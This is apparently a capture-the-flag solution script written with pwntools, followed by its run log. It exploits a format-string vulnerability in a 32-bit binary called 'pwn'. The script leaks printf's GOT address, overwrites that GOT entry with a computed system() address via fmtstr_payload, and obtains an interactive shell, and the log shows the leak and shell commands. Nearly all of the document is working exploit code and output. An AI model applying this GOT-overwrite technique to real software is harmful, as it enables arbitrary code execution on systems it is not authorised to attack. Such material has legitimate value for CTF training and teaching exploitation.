from pwn import *
from binascii import hexlify as h

r=process('./pwn')
elf=ELF('pwn')

fsb_leak_payload=p32(elf.got['printf'])
fsb_leak_payload+="%6$s"

r.recv()
r.send(fsb_leak_payload)
printf_leak=u32(r.recv()[4:8])
log.success('LeakPrintf:'+str(hex(printf_leak)))

fsb_attack_payload=fmtstr_payload(6,{elf.got['printf']:printf_leak-0xe8d0})

r.send(fsb_attack_payload)

r.interactive()
'''
cossack@ubuntu:~/Desktop/PWN/WangDing/2-pwn0-easyfmt$ python exp0.py 
[+] Starting local process './pwn': pid 13615
[+] Starting local process './pwn': pid 13615
[*] '/home/cossack/Desktop/PWN/WangDing/2-pwn0-easyfmt/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] LeakPrintf:0xf75a5670
[*] Switching to interactive mode
... ...
$ /bin/sh
$ ls
exp0.py  pwn

'''
